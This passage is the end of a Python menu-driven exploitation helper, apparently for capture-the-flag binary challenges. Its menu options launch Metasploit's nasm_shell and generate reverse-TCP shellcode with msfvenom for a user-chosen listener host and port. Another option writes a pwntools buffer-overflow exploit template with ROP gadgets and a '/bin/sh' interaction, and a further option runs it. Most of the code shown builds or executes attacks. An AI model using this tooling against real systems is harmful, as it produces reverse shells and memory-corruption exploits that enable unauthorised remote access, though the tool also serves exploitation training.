   if selection == '41':
      prompt() 
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Blank.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '42':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         pass
      prompt()  
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Blank.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '43':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         pass
      prompt()  
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Start nasm_shell.rb.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '44':
      print(colored("[*] Nasm shell initiated...\n", colour3))          
      command("/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb")
      prompt()  
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Generate shell code.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '45':
      localHost = input("[?] Please enter localhost value: ")
      localPort = input("[?] Please enter localport value: ")
      if COM[:3] == "ELF":
         command("msfvenom -p linux/x" + ARC[:2] + "/shell_reverse_tcp LHOST=" + localHost + " LPORT=" + localPort + " EXITFUNC=thread -f c -a x" + ARC[:2] + " > payload.tmp")
      else:
         command("msfvenom -p windows/shell_reverse_tcp LHOST=" + localHost + " LPORT=" + localPort + " EXITFUNC=thread -f c -a x" + ARC[:2] + " > payload.tmp")
      catsFile("payload.tmp")
      prompt()  
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Blank.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '46':
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Set remote IP and port value.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '47':
      remAddr = input("[?] Please enter remote IP address : ")
      remAddr = spacePadding(remAddr, COL1)
      remPort = input("[?] Please enter remote port number: ")
      remPort = spacePadding(remPort, COL1)
      prompt()      
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Generate exploit code.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '48':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         command("echo '#!/usr/bin/python' > " + localDir + "/exploit.py")
         command("echo '# coding:UTF-8' >> " + localDir + "/exploit.py")
         command("echo '' >> " + localDir + "/exploit.py")
         command("echo '# -------------------------------------------------------------------------------------'  >> " + localDir + "/exploit.py")
         command("echo '#                 PYTHON UTILITY SCRIPT FILE FOR BINARY EXPLOITATION' >> " + localDir + "/exploit.py")
         command("echo '#               BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)' >> " + localDir + "/exploit.py")
         command("echo '# -------------------------------------------------------------------------------------' >> " + localDir + "/exploit.py")
         command("echo '' >> " + localDir + "/exploit.py")
         command("echo 'from pwn import *' >> " + localDir + "/exploit.py")
         command("echo '' >> " + localDir + "/exploit.py")
         command("echo 'context.clear()' >> " + localDir + "/exploit.py")
         command("echo 'context.log_level = \"debug\"' >> " + localDir + "/exploit.py")
         command("echo 'context.binary = \"./" + FIL.rstrip(" ") + "\"' >> " + localDir + "/exploit.py")         
         command("echo '' >> " + localDir + "/exploit.py")         
         if COM[:3] == "ELF":
            command("echo '#context.os = \"linux\"' >> " + localDir + "/exploit.py")
         else:
            command("echo '#context.os = \"windows\"' >> " + localDir + "/exploit.py")
         command("echo '#context.arch = \"" + ARC.rstrip(" ") + "\"' >> " + localDir + "/exploit.py")
         command("echo '#context.bits = \"" + BITS[:2] + "\"' >> " + localDir + "/exploit.py")
         command("echo '#context.endian = \"" + IND.rstrip(" ") + "\"' >> " + localDir + "/exploit.py")
         command("echo '' >> " + localDir + "/exploit.py")
         command("echo 'try:' >> " + localDir + "/exploit.py")
         if remAddr[:7] == "unknown":
            command("echo '   s = remote(\"0\",0)' >> " + localDir + "/exploit.py")
         else:
            command("echo '   s = remote(\"" + remAddr.rstrip(" ") + "\", " + remPort.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
         command("echo 'except:' >> " + localDir + "/exploit.py")
         command("echo '   s = process(\"./" + FIL.rstrip(" ") + "\")'  >> " + localDir + "/exploit.py")
         command("echo '' >> " + localDir + "/exploit.py")        
         command("echo 'RAX = p64(" + RAX.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
         command("echo 'RBX = p64(" + RBX.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
         command("echo 'RCX = p64(" + RCX.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
         command("echo 'RDX = p64(" + RDX.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
         command("echo 'RSI = p64(" + RSI.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
         command("echo 'RDI = p64(" + RDI.rstrip(" ") + ") # pop rdi ; ret' >> " + localDir + "/exploit.py")
         command("echo 'RSP = p64(" + RSP.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
         command("echo 'RBP = p64(" + RBP.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
         command("echo 'RIP = p64(" + RIP.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
         command("echo '' >> " + localDir + "/exploit.py")        
         command("echo 'start = p64(" + SRT.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
         command("echo 'main  = p64(" + MAN.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
         command("echo 'jump  = p64(" + JMP.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
         command("echo 'write = p64(" + CUS.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
         command("echo '' >> " + localDir + "/exploit.py")
         if OFF2[:1] == "0":
            command("echo 'offset = " + OFF.rstrip(" ").replace("Bytes","") + "' >> " + localDir + "/exploit.py")
         else:
            command("echo 'offset = " + OFF2.rstrip(" ").replace("Bytes","") + "' >> " + localDir + "/exploit.py")         
         command("echo 'padding = \"a\" * offset' >> " + localDir + "/exploit.py")
         command("echo 'terminate = \"\\\\n\"' >> " + localDir + "/exploit.py")         
         command("echo '' >> " + localDir + "/exploit.py")         
         if JMP.rstrip(" ") != "0x0000000000000000":
            switch = 1           
         if CUS.rstrip(" ") != "0x0000000000000000":
            switch = 2  
         if RSI.rstrip(" ") != "0x0000000000000000":
            switch = 3         
         command("echo 'switch = " + str(switch) + "' >> " + localDir + "/exploit.py")
         command("echo '' >> " + localDir + "/exploit.py")                    
         command("echo 'if switch == 1:' >> " + localDir + "/exploit.py")
         command("echo '   payload = flat(padding,jump,terminate)' >> " + localDir + "/exploit.py")
         command("echo '#   print(payload)' >> " + localDir + "/exploit.py")
         command("echo '' >> " + localDir + "/exploit.py")
         command("echo 'if switch == 2:' >> " + localDir + "/exploit.py")
         command("echo '   payload = flat(padding,write,terminate)' >> "  + localDir + "/exploit.py")
         command("echo '#   print(payload)' >> " + localDir + "/exploit.py")         
         command("echo '' >> " + localDir + "/exploit.py")           
         command("echo 'if switch == 3:' >> " + localDir + "/exploit.py")
         command("echo '   payload = flat(padding,RDI,RSI,RCX,terminate)' >> "  + localDir + "/exploit.py")
         command("echo '#   print(payload)' >> " + localDir + "/exploit.py") 
         command("echo '   s.recvuntil(\">>\")' >> " + localDir + "/exploit.py")
         command("echo '   s.sendline(\"hof\")' >> " + localDir + "/exploit.py")
         command("echo '   s.recvuntil(\":\")' >> " + localDir + "/exploit.py")
         command("echo '   s.sendline(\"/bin/sh\")' >> " + localDir + "/exploit.py")
         command("echo '   s.recvuntil(\">>\")' >> " + localDir + "/exploit.py")
         command("echo '   s.sendline(\"flag\")' >> " + localDir + "/exploit.py")
         command("echo '   s.recvuntil(\":\")' >> " + localDir + "/exploit.py")         
         command("echo '' >> " + localDir + "/exploit.py")
         command("echo 's.send(payload)' >> " + localDir + "/exploit.py")
         command("echo '' >> " + localDir + "/exploit.py")
         command("echo 's.interactive()' >> " + localDir + "/exploit.py")
         command("echo 's.close()' >> " + localDir + "/exploit.py")
         print(colored("[*] Python exploit template sucessfully created...", colour3))
      prompt()                       

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Blank.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '49':     
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:  
         os.chdir(localDir)
         command("echo 'PWNED!!' > flag.txt")  
         os.system("python3 exploit.py")
         os.chdir("..")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Terminate program.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '50':        
      saveParams()
      command("rm *.tmp")    
      connection.close()
      print(colored("[*] Program sucessfully terminated...", colour3))
      exit(1)  
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Secret option
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '100':
      dispBanner("BINARY MASTER",1)
      print(colored("    C O P Y R I G H T  2 0 2 1  -  T E R E N C E  B R O A D B E N T",colour7,attrs=['bold']))
      print("\n----------------------------------------------------------------------------")     
      prompt()      
# Eof...
